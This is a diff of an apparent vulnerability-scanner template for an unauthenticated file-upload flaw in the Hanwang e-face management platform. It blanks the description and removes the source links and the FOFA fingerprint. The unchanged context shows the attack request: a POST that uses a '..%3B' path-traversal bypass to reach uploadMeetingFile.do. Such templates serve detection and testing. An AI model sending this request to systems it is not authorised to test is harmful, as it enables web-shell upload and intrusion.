@@ -3,12 +3,8 @@ info:
   name: 汉王e脸通综合管理平台 uploadMeetingFile.do文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ikotoba4wc7iymf2'
+  description: ''
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ikotoba4wc7iymf2
-    fofa: icon_hash="1380907357"
 http:
 - raw:
   - 'POST /manage/intercom/..%3B/..%3B/manage/meetingPersonal/uploadMeetingFile.do HTTP/1.1
@@ -37,7 +33,6 @@ http:
 
     ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1750483690340-4c5019a7-d5e9-4783-b9e9-cabe578a48b5.png)
 
     验证路径
 
